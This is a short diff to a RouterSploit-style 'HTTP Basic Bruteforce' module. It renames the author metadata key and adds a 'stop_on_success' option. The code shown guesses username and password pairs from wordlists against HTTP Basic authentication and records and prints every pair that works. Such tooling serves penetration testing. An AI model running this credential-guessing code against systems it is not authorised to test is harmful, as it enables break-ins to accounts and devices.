@@ -23,7 +23,7 @@ class Exploit(exploits.Exploit):
     """
     __info__ = {
         'name': 'HTTP Basic Bruteforce',
-        'author': [
+        'authors': [
             'Marcin Bury <marcin.bury[at]reverse-shell.com>'  # routersploit module
         ]
     }
@@ -36,6 +36,7 @@ class Exploit(exploits.Exploit):
     passwords = exploits.Option(wordlists.passwords, 'Password or file with passwords (file://)')
     path = exploits.Option('/', 'URL Path')
     verbosity = exploits.Option('yes', 'Display authentication attempts')
+    stop_on_success = exploits.Option('yes', 'Stop on first valid authentication attempt')
 
     credentials = []
 
@@ -92,7 +93,9 @@ class Exploit(exploits.Exploit):
                 response = http_request(method="GET", url=url, auth=(user, password))
 
                 if response.status_code != 401:
-                    running.clear()
+                    if boolify(self.stop_on_success):
+                        running.clear()
+
                     print_success("Target: {}:{} {}: Authentication Succeed - Username: '{}' Password: '{}'".format(self.target, self.port, name, user, password), verbose=module_verbosity)
                     self.credentials.append((self.target, self.port, user, password))
                 else:
